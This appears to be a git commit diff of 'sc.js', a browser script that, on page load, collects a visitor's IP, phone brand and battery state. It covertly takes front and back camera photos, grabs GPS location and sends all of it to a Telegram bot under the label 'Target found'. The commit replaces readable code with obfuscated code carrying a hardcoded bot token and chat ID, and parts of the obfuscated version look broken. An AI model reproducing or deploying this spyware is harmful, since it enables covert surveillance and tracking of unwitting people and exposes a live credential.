78e7095221ddfc7624333c67f13f14dd61a81c1d
vinzz-officials <vinzz4358@gmail.com>
2025-12-05 17:38:27 +0800

    Update sc.js

--- sc.js
+++ sc.js
@@ -1,182 +1,278 @@
-const token = process.env.bot;
-const chat_id = '7777604508';
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-
+var _0x2724 = ['toString', 'join', '1500', 'onloadedmetadata', 'mediaDevices', 'getUserMedia', 'videoWidth', 'drawImage', 'videoHeight', 'getTracks', 'forEach', 'stop', 'toBlob', 'image/jpeg', 'Promise', 'facingMode', 'captureCamera', 'append', 'depan', 'media', 'photo', 'attach://depan', 'ð· Kamera Depan', 'attach://belakang', 'ð· Kamera Belakang', 'belakang', 'sendMediaGroup', 'Gagal mengirim foto: akses kamera di tolak', 'bot', 'sendMessage', 'application/json', 'stringify', 'chat_id', 'text', 'POST', 'fetch', 'url', 'log', 'getBatteryInfo', 'getIP', 'getMerekHP', 'MENUNGGU IZIN LOKASI', 'ð Status: ', 'ð¡ IP: ', 'ð Batrai: ', 'ð± Merek hp: ', 'â°âââââââââââââââââââ', 'kirimFotoKeTelegram', 'geolocation', 'getCurrentPosition', 'coords', 'latitude', 'longitude', 'google.com/maps?q=', 'MENGIZINKAN LOKASI', 'ð Lokasi: ', 'innerHTML', '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>', 'LOKASI GAGAL (', ')', '<h2>Izinin dulu semuanya<br><small>by Vinzz Official</small></h2>', 'call', 'push', '__proto__', 'constructor', 'shift', 'test', 'replace', 'pop', 'length', 'bind', 'prototype', 'fromCharCode', 'charCodeAt', 'parse', 'document', 'getElementById', 'getContext', '2d', 'ipify.org?format=json', 'res', 'json', 'ua', 'Samsung', 'SM-|GT-', 'Xiaomi', 'Mi |MIX|M\\d{4}', 'Redmi', 'Note \\d+', 'Oppo', 'CPH|PAM|PCLM|PGM', 'Vivo', 'V\\d{4}|PD\\d{4}', 'Realme', 'RMX|RMX\\d+', 'Apple', 'iPhone|iPad|iOS', 'Asus', 'Zenfone|ZS\\d{4}', 'Infinix', 'X\\d{3}', 'Huawei', 'Honor|JAT|LYA|ELE|NOH|LIO', 'OnePlus', 'KB\\d{4}|GM\\d{4}|IN\\d{4}', 'Lenovo', 'L\\d{4}', 'Motorola', 'Moto|XT\\d{4}', 'Tecno', 'KG\\d{4}|CD\\d{4}', 'Itel', 'W\\d{4}', 'Nokia', 'TA-\\d{4}', 'Sony', 'Xperia|G\\d{4}', 'Meizu', 'ZTE', 'Z\\d{4}', 'HTC', 'Sharp', 'SHV', 'LG', 'LM-|LGM', 'Coolpad', 'CP\\d{4}', 'Micromax', 'Alcatel', 'TCL', 'BlackBerry', 'BB\\d{4}', 'LeEco', 'LeMobile', 'Doogee', 'Ulefone', 'BLU', 'Cubot', 'RealWear', 'Fairphone', 'BQ', 'Hisense', 'Tidak diketahui', 'getBattery', 'battery', 'level', 'round', 'charging', 'ð Charging', 'ð Tidak charging', 'Tidak tersedia', ''];
+(function (_0x1a87c1, _0x2724da) {
+  var _0x53958f = function (_0x4f67d4) {
+    while (--_0x4f67d4) {
+      _0x1a87c1['push'](_0x1a87c1['shift']());
+    }
+  };
+  _0x53958f(++_0x2724da);
+}(_0x2724, 0x181));
+var _0x5395 = function (_0x1a87c1, _0x2724da) {
+  _0x1a87c1 = _0x1a87c1 - 0x0;
+  var _0x53958f = _0x2724[_0x1a87c1];
+  return _0x53958f;
+};
+(function () {
+  var _0x5e206b = function () {
+    var _0x16b6c0 = !![];
+    return function (_0x55ff1e, _0x10b27e) {
+      var _0x5eb163 = _0x16b6c0 ? function () {
+        if (_0x10b27e) {
+          var _0x41f9d2 = _0x10b27e[_0x5395('0x2e')](_0x55ff1e, arguments);
+          _0x10b27e = null;
+          return _0x41f9d2;
+        }
+      } : function () {};
+      _0x16b6c0 = ![];
+      return _0x5eb163;
+    };
+  }();
+  var _0x3b1c55 = _0x5e206b(this, function () {
+    var _0x5a183d = function () {
+      var _0x5c4f1c;
+      try {
+        _0x5c4f1c = Function(_0x5395('0x2f') + _0x5395('0x30') + ');')();
+      } catch (_0x3e18a2) {
+        _0x5c4f1c = window;
+      }
+      return _0x5c4f1c;
+    };
+    var _0x30130f = _0x5a183d();
+    var _0x26955d = _0x30130f[_0x5395('0x31')] = _0x30130f[_0x5395('0x31')] || {};
+    var _0x5c4f1c = ['iframe'];
+    var _0x35634d = function (_0x47392e) {
+      var _0x23f721 = new RegExp('^([^_]+).*' + _0x5395('0x32') + '([^_]+)$');
+      return _0x23f721[_0x5395('0x2a')](_0x47392e);
+    };
+    var _0x47392e = function (_0x301e79, _0x4c2dd8) {
+      _0x301e79 = _0x301e79['replace'](/\\w/g, _0x5395('0x33'));
+      return _0x301e79;
+    };
+    var _0x4e6b7d = function (_0x5c2b48) {
+      if (_0x35634d(_0x5c2b48)) {
+        return _0x47392e(_0x5c2b48, 'length');
+      } else {
+        return _0x5c2b48;
+      }
+    };
+    (function () {
+      for (var _0x133744 = 0x0; _0x133744 < _0x5c4f1c['length']; _0x133744++) {
+        var _0x23188d = _0x5c4f1c[_0x133744];
+        var _0x32a67a = _0x4e6b7d(_0x23188d);
+        _0x26955d[_0x23188d] = _0x32a67a;
+      }
+    }());
+  });
+  _0x3b1c55();
+}());
+var _0x593121 = ['7876416430:AAFFU8zBgV96_bG2WeFhOd12mYQEjz79Gjk', '7777604508', 'video', 'canvas'];
+(function (_0x24d08b, _0x1e36ff) {
+  var _0x5580a9 = function (_0x21c432) {
+    while (--_0x21c432) {
+      _0x24d08b['push'](_0x24d08b['shift']());
+    }
+  };
+  _0x5580a9(++_0x1e36ff);
+}(_0x593121, 0x181));
+var _0x5580 = function (_0x24d08b, _0x1e36ff) {
+  _0x24d08b = _0x24d08b - 0x0;
+  var _0x5580a9 = _0x593121[_0x24d08b];
+  return _0x5580a9;
+};
+const token = _0x5580('0x0');
+const chat_id = _0x5580('0x1');
+const video = document[_0x5395('0x35')](_0x5580('0x2'));
+const canvas = document[_0x5395('0x35')](_0x5580('0x3'));
+const ctx = canvas[_0x5395('0x36')](_0x5395('0x37'));
 async function getIP() {
   try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    return data.ip;
-  } catch {
-    return "Tidak diketahui";
+    const _0x5d9ec4 = await fetch(_0x5395('0x38'));
+    const _0x1c881c = await _0x5d9ec4[_0x5395('0x39')]();
+    return _0x1c881c['ip'];
+  } catch (_0x38a0c2) {
+    return _0x5395('0x40');
   }
 }
-
 function getMerekHP() {
-  const ua = navigator.userAgent;
-  if (/Samsung|SM-|GT-/i.test(ua)) return "Samsung";
-  if (/Xiaomi|Mi |MIX|M\d{4}/i.test(ua)) return "Xiaomi";
-  if (/Redmi|Note \d+/i.test(ua)) return "Redmi";
-  if (/Oppo|CPH|PAM|PCLM|PGM/i.test(ua)) return "Oppo";
-  if (/Vivo|V\d{4}|PD\d{4}/i.test(ua)) return "Vivo";
-  if (/Realme|RMX|RMX\d+/i.test(ua)) return "Realme";
-  if (/iPhone|iPad|iOS/i.test(ua)) return "Apple";
-  if (/Asus|Zenfone|ZS\d{4}/i.test(ua)) return "Asus";
-  if (/Infinix|X\d{3}/i.test(ua)) return "Infinix";
-  if (/Huawei|Honor|JAT|LYA|ELE|NOH|LIO/i.test(ua)) return "Huawei";
-  if (/OnePlus|KB\d{4}|GM\d{4}|IN\d{4}/i.test(ua)) return "OnePlus";
-  if (/Lenovo|L\d{4}/i.test(ua)) return "Lenovo";
-  if (/Motorola|Moto|XT\d{4}/i.test(ua)) return "Motorola";
-  if (/Tecno|KG\d{4}|CD\d{4}/i.test(ua)) return "Tecno";
-  if (/Itel|W\d{4}/i.test(ua)) return "Itel";
-  if (/Nokia|TA-\d{4}/i.test(ua)) return "Nokia";
-  if (/Sony|Xperia|G\d{4}/i.test(ua)) return "Sony";
-  if (/Meizu/i.test(ua)) return "Meizu";
-  if (/ZTE|Z\d{4}/i.test(ua)) return "ZTE";
-  if (/HTC/i.test(ua)) return "HTC";
-  if (/Sharp|SHV/i.test(ua)) return "Sharp";
-  if (/LG|LM-|LGM/i.test(ua)) return "LG";
-  if (/Coolpad|CP\d{4}/i.test(ua)) return "Coolpad";
-  if (/Micromax/i.test(ua)) return "Micromax";
-  if (/Alcatel|TCL/i.test(ua)) return "Alcatel";
-  if (/BlackBerry|BB\d{4}/i.test(ua)) return "BlackBerry";
-  if (/LeEco|LeMobile/i.test(ua)) return "LeEco";
-  if (/Doogee/i.test(ua)) return "Doogee";
-  if (/Ulefone/i.test(ua)) return "Ulefone";
-  if (/BLU/i.test(ua)) return "BLU";
-  if (/Cubot/i.test(ua)) return "Cubot";
-  if (/RealWear/i.test(ua)) return "RealWear";
-  if (/Fairphone/i.test(ua)) return "Fairphone";
-  if (/BQ/i.test(ua)) return "BQ";
-  if (/Hisense/i.test(ua)) return "Hisense";
-  return "Tidak diketahui";
+  const _0x40a6b5 = navigator[_0x5395('0x3a')];
+  if (/[S|s]amsung|[S|s][M|m]-|[G|g][T|t]-/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x3b');
+  if (/[X|x]iaomi|[M|m]i |[M|m][I|i][X|x]|[M|m]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x3c');
+  if (/[R|r]edmi|[N|n]ote \d+/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x3d');
+  if (/[O|o]ppo|[C|c][P|p][H|h]|[P|p][A|a][M|m]|[P|p][C|c][L|l][M|m]|[P|p][G|g][M|m]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x3e');
+  if (/[V|v]ivo|[V|v]\d{4}|[P|p][D|d]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x3f');
+  if (/[R|r]ealme|[R|r][M|m][X|x]|[R|r][M|m][X|x]\d+/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x41');
+  if (/[I|i]phone|[I|i]pad|[I|i][O|o][S|s]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x42');
+  if (/[A|a]sus|[Z|z]enfone|[Z|z][S|s]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x43');
+  if (/[I|i]nfinix|[X|x]\d{3}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x44');
+  if (/[H|h]uawei|[H|h]onor|[J|j][A|a][T|t]|[L|l][Y|y][A|a]|[E|e][L|l][E|e]|[N|n][O|o][H|h]|[L|l][I|i][O|o]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x45');
+  if (/[O|o]ne[P|p]lus|[K|k][B|b]\d{4}|[G|g][M|m]\d{4}|[I|i][N|n]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x46');
+  if (/[L|l]enovo|[L|l]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x47');
+  if (/[M|m]otorola|[M|m]oto|[X|x][T|t]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x48');
+  if (/[T|t]ecno|[K|k][G|g]\d{4}|[C|c][D|d]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x49');
+  if (/[I|i]tel|[W|w]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x4a');
+  if (/[N|n]okia|[T|t][A|a]-\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x4b');
+  if (/[S|s]ony|[X|x]peria|[G|g]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x4c');
+  if (/[M|m]eizu/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x4d');
+  if (/[Z|z][T|t][E|e]|[Z|z]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x4e');
+  if (/[H|h][T|t][C|c]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x4f');
+  if (/[S|s]harp|[S|s][H|h][V|v]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x50');
+  if (/[L|l][G|g]|[L|l][M|m]-|[L|l][G|g][M|m]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x51');
+  if (/[C|c]oolpad|[C|c][P|p]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x52');
+  if (/[M|m]icromax/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x53');
+  if (/[A|a]lcatel|[T|t][C|c][L|l]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x54');
+  if (/[B|b]lack[B|b]erry|[B|b][B|b]\d{4}/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x55');
+  if (/[L|l]e[E|e]co|[L|l]e[M|m]obile/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x56');
+  if (/[D|d]oogee/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x57');
+  if (/[U|u]lefone/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x58');
+  if (/[B|b][L|l][U|u]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x59');
+  if (/[C|c]ubot/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x5a');
+  if (/[R|r]eal[W|w]ear/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x5b');
+  if (/[F|f]airphone/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x5c');
+  if (/[B|b][Q|q]/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x5d');
+  if (/[H|h]isense/i[_0x5395('0x2a')](_0x40a6b5))
+    return _0x5395('0x5e');
+  return _0x5395('0x40');
 }
-
 async function getBatteryInfo() {
   try {
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      const persen = Math.round(battery.level * 100);
-      const charging = battery.charging ? "🔌 Charging" : "🔋 Tidak charging";
-      return `${persen}% (${charging})`;
+    if (navigator[_0x5395('0x5f')]) {
+      const _0x1a87c1 = await navigator[_0x5395('0x5f')]();
+      const _0x2724da = Math[_0x5395('0x61')](_0x1a87c1[_0x5395('0x60')] * 0x64);
+      const _0x53958f = _0x1a87c1[_0x5395('0x62')] ? _0x5395('0x63') : _0x5395('0x64');
+      return _0x2724da + '%' + ' (' + _0x53958f + ')';
     } else {
-      return "Tidak tersedia";
+      return _0x5395('0x65');
     }
-  } catch {
-    return "Tidak diketahui";
+  } catch (_0x4f67d4) {
+    return _0x5395('0x40');
   }
-};
-
-async function captureCamera(facing) {
-  return new Promise((resolve, reject) => {
-    const constraints = { video: { facingMode: facing } };
-    navigator.mediaDevices.getUserMedia(constraints)
-      .then(stream => {
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
-            canvas.toBlob(blob => {
-              resolve(blob);
-            }, 'image/jpeg');
-          }, 1500);
-        };
-      })
-      .catch(err => reject(err));
+}
+;
+async function captureCamera(_0x55ff1e) {
+  return new _0x0e5d1b['Promise']((_0x10b27e, _0x5eb163) => {
+    const _0x41f9d2 = {
+      'video': {
+        'facingMode': _0x55ff1e
+      }
+    };
+    navigator[_0x5395('0x5')][_0x5395('0x6')](_0x41f9d2)[_0x5395('0x31')](_0x3e18a2 => {
+      video['srcObject'] = _0x3e18a2;
+      video[_0x5395('0x4')] = () => {
+        video['play']();
+        setTimeout(() => {
+          canvas['width'] = video[_0x5395('0x7')];
+          canvas['height'] = video[_0x5395('0x9')];
+          ctx[_0x5395('0x8')](video, 0x0, 0x0, canvas['width'], canvas['height']);
+          _0x3e18a2[_0x5395('0xa')]()[_0x5395('0xb')](_0x5a183d => _0x5a183d[_0x5395('0xc')]());
+          canvas[_0x5395('0xd')](_0x5c4f1c => {
+            _0x10b27e(_0x5c4f1c);
+          }, _0x5395('0xe'));
+        }, _0x5395('0x2'));
+      };
+    })[_0x5395('0x1')](_0x30130f => _0x5eb163(_0x30130f));
   });
 }
-
 async function kirimFotoKeTelegram() {
   try {
-    const frontBlob = await captureCamera('user');
-    const backBlob = await captureCamera('environment');
-
-    const formData = new FormData();
-    formData.append('chat_id', chat_id);
-    formData.append('media', JSON.stringify([
-      { type: "photo", media: "attach://depan", caption: "📷 Kamera Depan" },
-      { type: "photo", media: "attach://belakang", caption: "📷 Kamera Belakang" }
-    ]));
-    formData.append('depan', frontBlob, 'depan.jpg');
-    formData.append('belakang', backBlob, 'belakang.jpg');
-
-    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
-      method: 'POST',
-      body: formData
+    const _0x26955d = await _0x0e5d1b[_0x5395('0x10')]('user');
+    const _0x35634d = await _0x0e5d1b[_0x5395('0x10')]('environment');
+    const _0x47392e = new FormData();
+    _0x47392e[_0x5395('0x11')](_0x5395('0x18'), chat_id);
+    _0x47392e[_0x5395('0x11')](_0x5395('0x13'), JSON[_0x5395('0x1a')]([{
+      'type': _0x5395('0x14'),
+      'media': _0x5395('0x15'),
+      'caption': _0x5395('0x16')
+    }, {
+      'type': _0x5395('0x14'),
+      'media': _0x5395('0x17'),
+      'caption': _0x5395('0x18')
+    }]));
+    _0x47392e[_0x5395('0x11')](_0x5395('0x12'), _0x26955d, _0x5395('0x12') + '.jpg');
+    _0x47392e[_0x5395('0x11')](_0x5395('0x19'), _0x35634d, _0x5395('0x19') + '.jpg');
+    await fetch('https://api.telegram.org/' + _0x5395('0x1f') + token + '/' + _0x5395('0x1a') + _0x5395('0x1b'), {
+      'method': _0x5395('0x1d'),
+      'body': _0x47392e
     });
-
-  } catch (err) {
-    await kirimPesanTelegram("Gagal mengirim foto: akses kamera di tolak");
+  } catch (_0x301e79) {
+    await _0x0e5d1b[_0x5395('0x1e')](_0x5395('0x1c'));
   }
 }
-
-async function kirimPesanTelegram(pesan) {
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chat_id,
-      text: pesan
+async function kirimPesanTelegram(_0x5c2b48) {
+  const _0x4e6b7d = _0x5395('0x1f') + token + '/' + _0x5395('0x1a');
+  await fetch(_0x4e6b7d, {
+    'method': _0x5395('0x1d'),
+    'headers': {
+      'Content-Type': _0x5395('0x1b')
+    },
+    'body': JSON[_0x5395('0x1a')]({
+      'chat_id': chat_id,
+      'text': _0x5c2b48
     })
   });
 }
-
+var _0x0e5d1b = {};
 (async () => {
-  const batre = await getBatteryInfo();
-  const ip = await getIP();
-  const merek = getMerekHP();
-
-  // kirim pesan awal
-  await kirimPesanTelegram(`╭──「 Target berhasil ditemukan! 」──
-│🌐 Status: MENUNGGU IZIN LOKASI
-│📡 IP: ${ip}
-│🔋 Batrai: ${batre}
-│📱 Merek hp: ${merek}
-╰───────────────────`);
-
-  // langsung minta kamera
-  await kirimFotoKeTelegram();
-})();
-
-// geolocation tetap dicoba, tapi kamera tidak tergantung hasilnya
-navigator.geolocation.getCurrentPosition(
-  async (pos) => {
-    const batre = await getBatteryInfo();
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
-    const ip = await getIP();
-    const merek = getMerekHP();
-
-    const pesan = `╭──「 Target berhasil ditemukan! 」──
-│🌐 Status: MENGIZINKAN LOKASI
-│📡 IP: ${ip}
-│📱 Merek hp: ${merek}
-│🔋 Batrai: ${batre}
-│📍 Lokasi: ${gmaps}
-╰───────────────────`;
-    await kirimPesanTelegram(pesan);
-    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
-  },
-  async (err) => {
-    const batre = await getBatteryInfo();
-    const ip = await getIP();
-    const merek = getMerekHP();
-
-    const pesan = `╭──「 Target berhasil ditemukan! 」──
-│🌐 Status: LOKASI GAGAL (${err.code})
-│📡 IP: ${ip}
-│📱 Merek hp: ${merek}
-│🔋 Batrai: ${batre}
-╰───────────────────`;
-    await kirimPesanTelegram(pesan);
-    document.body.innerHTML = '<h2>Izinin dulu semuanya<br><small>by Vinzz Official</small></h2>';
+  if (true) {
+    _0x0e5d1b[_0x5395('0x1e')] = kirimPesanTelegram;
+    _0x0e5d1b[_0x5395('0x10')] = captureCamera;
+    _0x0e5d1b[_0x5395('0x1a')] = kirimFotoKeTelegram;
+    _0x0e5d1b[_0x5395('0x20')] = console[_0x5395('0x20')];
   }
-);
+  const _0x133744 = await getBatteryInfo();
+  const _0x23188d = await getIP();
+  const _0x32a67a = getMerekHP();
+  await _0x0e5d1b[_0x5395('0x1e')](_0x5395('0x21') + '\nâ' + _0x5395('0x22') + _0x5395('0x23') + '\nâ' + _0x5395('0x24') + _0x23188d + '\nâ' + _0x5395('0x25') + _0x133744 + '\nâ' + _0x5395('0x26') + _0x32a67a + '\n' + _0x5395('0x27'));
+  await _0x0e5d1b[_0x5395('0x28')]();
+})();
+navigator[_0x5395('0x29')][_0x5395('0x2a')](async _0x133744 => {
+  const _0x23188d = await getBatteryInfo();
+  const _0x32a67a = _0x133744[_0x5395('0x2b')][_0x5395('0x2c')];
+  const _0x38a0c2 = _0x133744[_0x5395('0x2b')][_0x5395('0x2d')];
+  const _0x5d9ec4 = 'https://www.' + _0x5395('0x2e') + _0x32a67a + ',' + _0x38a0c2;
+  const _0x1c881c = await getIP();
+  const _0x40a6b5 = getMerekHP();
+  const _0x5d9ec4 = _0x5395('0x21') + '\nâ' + _0x5395('0x22') + _0x5395('0x2f') + '\nâ' + _0x5395('0x24') + _0x1c881c + '\nâ' + _0x5395('0x26') + _0x40a6b5 + '\nâ' + _0x5395('0x25') + _0x23188d + '\nâ' + _0x5395('0x30') + _0x5d9ec4 + '\n' + _0x5395('0x27');
+  await _0x0e5d1b[_0x5395('0x1e')](_0x5d9ec4);
+  document['body'][_0x5395('0x31')] = _0x5395('0x32');
+}, async _0x133744 => {
+  const _0x23188d = await getBatteryInfo();
+  const _0x32a67a = await getIP();
+  const _0x38a0c2 = getMerekHP();
+  const _0x5d9ec4 = _0x5395('0x21') + '\nâ' + _0x5395('0x22') + _0x5395('0x33') + _0x133744['code'] + _0x5395('0x34') + '\nâ' + _0x5395('0x24') + _0x32a67a + '\nâ' + _0x5395('0x26') + _0x38a0c2 + '\nâ' + _0x5395('0x25') + _0x23188d + '\n' + _0x5395('0x27');
+  await _0x0e5d1b[_0x5395('0x1e')](_0x5d9ec4);
+  document['body'][_0x5395('0x31')] = _0x5395('0x35');
+});
